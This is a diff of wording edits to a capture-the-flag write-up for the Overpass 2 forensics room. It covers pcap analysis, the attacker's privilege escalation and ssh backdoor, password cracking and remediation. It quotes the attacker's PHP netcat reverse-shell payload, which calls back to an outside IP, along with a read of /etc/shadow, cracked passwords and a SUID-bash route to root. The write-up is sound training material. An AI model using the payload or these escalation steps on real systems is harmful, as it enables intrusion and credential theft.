@@ -6,13 +6,13 @@
 
 Let's go ahead and make a directory for this room.
 
-Now, download pcapng file into the directory.
+Now, we can download the pcapng file into the directory.
 
-** 1) What was the URL of the page they used to upload a reverse shell?**
+**1) What was the URL of the page they used to upload a reverse shell?**
 
-Let's open wireshark and drag in the PCAP to investigate what occurred.
+Let's open Wireshark and drag in the PCAP to investigate what occurred.
 
-You can also use terminal to open as root.
+You can also use terminal to open the capture as root.
 
 ```
 sudo wireshark overpass2.pcapng
@@ -35,7 +35,7 @@ If-None-Match: "588-5aae9add656f8-gzip"
 
 Now that we know the directory of the URL used by the adversary, we can move on to the next stream.
 
-** 2) What payload did the attacker use to gain access?**
+**2) What payload did the attacker use to gain access?**
 
 Let's start by following the next TCP stream on line 11.
 
@@ -65,7 +65,7 @@ Upload File
 -----------------------------1809049028579987031515260006--
 ```
 
-With this stream we can see they used upload.php to upload payload.php along with the payload which appears to be a shell using netcat.
+With this stream we can see they used upload.php to upload their payload, payload.php using netcat.
 
 ```
 <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
@@ -75,9 +75,9 @@ We see a HTTP/1.1 200 OK which means that it was successful.
 
 ** 3) What password did the attacker use to privesc?**
 
-Luckily for us, netcat transmits everything in plaintext. So we can actually middleman that password used.
+Luckily for us, netcat transmits everything in plaintext. So we can actually middleman that password used along with their actions before switching to a more obfuscated shell.
 
-Jump through the streams until you get to one that you see plaintext commands.
+Jump through the streams until you get to one with plaintext commands.
 
 ```
 tcp.stream eq 3
@@ -259,48 +259,48 @@ We can see in the stream the password used by the attacker to escalate to the us
 
 **4) How did the attacker establish persistence?**
 
-We're going to go through these commands and examine exactly what this attacker did.
+We're going to go through these commands and examine exactly what was done by the adversary.
 
 * id
 
-Checks to see what user they are currently.
+Checks to see what user they are currently and the privileges associated.
 
-* python 3 -c 'import pt;pty.spawn("bin/bash")'
+* python3 -c 'import pt;pty.spawn("bin/bash")'
 
-They then import the pty module to spawn a more stable shell.
+They then import the pty module to spawn a more stable bash shell because they have the required permissions.
 
 However, this is still not persistent.
 
 * ls -lAh
 
-The adversary then begins looking for files, including hidden files.
+The adversary then begins looking for files, including hidden files and their permissions.
 
 * cat .overpass
 
-The . in front of overpass indicates it is a hidden file. They cat it to view the hidden file looking for information to escalate privileges.
+The . in front of overpass indicates it is a hidden file. They cat it to view the hidden file looking for credentials to escalate privileges.
 
 * su james
 
-It looks like they found a user, you can see they enter the password. These were both likely found in the hidden file.
+It looks like they found a user, you can see they enter the password. These were both likely found in the hidden file. They switch their bash user from www/data to james.
 
 * cd ~
 
-Now that they are user James they are going to cd to the home directory. The ~ is unnecessary because they could have just used cd for this.
+Now that they are user james, they are going to cd to the home directory. The ~ is unnecessary because they could have just used cd for this.
 
 * sudo -l]
 
-Another error by the adversary, they were trying to list privileges but added a ]
+Another mistake by the adversary, they were trying to list privileges but added a ]
 
 * sudo -l
 
-Finally they were able to list privileges of their compromised user, james. Specifically, what commands james can run as root.
+Finally, they were able to list privileges of their compromised user james. The adversary learnes here what commands they can now run as root.
 
 ```
 User james may run the following commands on overpass-production:
     (ALL : ALL) ALL
 ```
 
-The attacker got lucky here. James can run all commands as root.
+The attacker got lucky here. James has access to all commands.
 
 * sudo cat /etc/shadow
 
@@ -328,7 +328,7 @@ They then make the backdoor executable as root, and can launch it since they hav
 
 * ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
 
-The attacker has established persistence, and runs the ssh backdoor.
+The attacker has established persistence, and runs the ssh backdoor with their desired hash.
 
 ** 5) Using the fasttrack wordlist, how many of the system passwords were crackable?**
 
@@ -336,13 +336,13 @@ Now, we should find out which accounts have been compromised by the attacker in 
 
 We can note that the following users returned hashes, hopefully they used secure passwords that cannot be cracked.
 
-* james (already compromised)
+* james (compromised by .overpass)
 * paradox
 * szymex
 * bee
 * muirland
 
-We can note that these are most likely all SHA512 crypt.
+We can note that these are most likely all SHA512 crypt because they start with **$6$**.
 
 Let's go ahead and run [John the Ripper](https://github.com/openwall/john) along with the fasttrack wordlist on the hashes we received.
 
@@ -350,7 +350,7 @@ Let's go ahead and run [John the Ripper](https://github.com/openwall/john) along
 sudo john hashes.txt --wordlist=/usr/share/wordlists/fasttrack.txt
 ```
 
-Unfortunately, every created user has been compromised. We weren't able to fasttrack james, but he was already compromised.
+Unfortunately, every created user has been compromised. We weren't able to fasttrack james, but he was already compromised by the attacker.
 
 ```
 bee;secret12
@@ -361,7 +361,7 @@ paradox;secuirty3
 
 ## Task 2: Research - Analyse the code
 
-Now for some fun, lets go ahead and clone that backdoor to our overpass 2 directory we created using the same cloning command as the attacker. Luckily, since its open source on github we won't have to do any reverse engineering or deobfuscation.
+Now for some fun, lets go ahead and clone that backdoor to our overpass 2 directory we created using the same cloning command as the attacker. Luckily, since its open source on github we won't have to do any reverse engineering.
 
 **Please do not install this backdoor on your personal computer.**
 
@@ -408,7 +408,9 @@ func hashPassword(password string, salt string) string {
 }
 ```
 
-We can see that it uses the Sha512 with the password and then the salt which was hardcoded. I'm actually going to be using [hashcat](https://github.com/hashcat/hashcat) for this because it has a mode for sha512($pass.$salt).
+We can see that it uses the sha512 with the password and then the salt which was hardcoded. 
+
+After seeing the format is formatted differently than normal sha512 due to the salt and hash, I'm actually going to be using [hashcat](https://github.com/hashcat/hashcat). This is because it has a mode for the formatting used [sha512($pass.$salt)](https://hashcat.net/wiki/doku.php?id=example_hashes).
 
 ```
 hashcat --force -m 1710 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
@@ -458,7 +460,7 @@ Navigate to the site and view the source.
 
 **2) What's the user flag?**
 
-Alright, now that we've gotten the credentials for the backdoor, let's try to ssh in with them!
+Alright, now that we've gotten the credentials for the backdoor... let's try to ssh in with them!
 
 ```
 ssh james@10.10.70.23 -p 2222
@@ -475,11 +477,11 @@ james@overpass-production:/home/james/ssh-backdoor$
 
 Now that we've got into the backdoor, let's look around with ls and cd.
 
-Navigate to the home directory to find the user flag.
+Navigate to the home directory to find the user flag (cd ~ or cd).
 
 **3) What's the root flag?**
 
-When I was listing James' home directory, I used ls -a and found a very interesting bash file.
+When I was listing james' home directory, I used ls -a and found a very interesting bash file.
 
 ```
 ls -a
@@ -501,11 +503,11 @@ uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(
 .suid_bash-4.4$ 
 ```
 
-I tried putting sudo in front of the run for bash but James' password is not the same as the ssh backdoor or what the password was previously (whenevernoteartinstant).
+I tried putting sudo in front of the bash execution, but james' password is not the same as the ssh backdoor or what the password was previously (whenevernoteartinstant).
 
-Unfortunately, we still do not have permissions but this file might be able to escalate us somehow.
+Unfortunately, we still do not have permissions but this file might be able to escalate us, we need to check if it has the proper SUID.
 
-If we run ls -lah on the home directory, we see that .suid_bash is exactly what we need to get root. It looks like it was installed by the hacker.
+If we run ls -lah on the home directory, we see that .suid_bash is exactly what we need to get root. It looks like it was implemented by the hacker.
 
 ```
 -rwsr-sr-x 1 root  root  1.1M Jul 22  2020 .suid_bash
@@ -522,7 +524,7 @@ root
 .suid_bash-4.4# 
 ```
 
-Owned, let's go to /root and cat the flag :)
+Owned, let's cd to /root and cat the flag :)
 
 ### Congratulations! You're done with the room!
 
@@ -530,18 +532,18 @@ Owned, let's go to /root and cat the flag :)
 
 ### Initial Access
 
-Next, we've got to take out the way that they got in. You can actually see a note in \development\index.html aknowledging they we're warned about this.
+First, we've got to take out the way that they got in. You can actually see a note in \development\index.html aknowledging they were warned about this.
 
 ```html
 <!-- Muiri tells me this is insecure, I only learnt PHP this week so maybe I should let him fix it? Something about php eye en eye? -->
 ```
 
 1. Add a login where only admins can upload, and make sure that it cannot be bruteforced.
-2. Disallow file extensions that will not be uploaded in uploads.php code, it currently allows any file type.
+2. Disallow file extensions that will not be uploaded in uploads.php, it currently allows any file type.
 
 ### Privilege Escalation
 
-James should only have have access to run the commands needed, not all commands.
+James should only have have access to run the commands needed as root, not all commands.
 
 Clean the bash in /home/james directory. It has .suid_bash along with .overpass, which were both used for escalation. It also contains the ssh-backdoor.
 
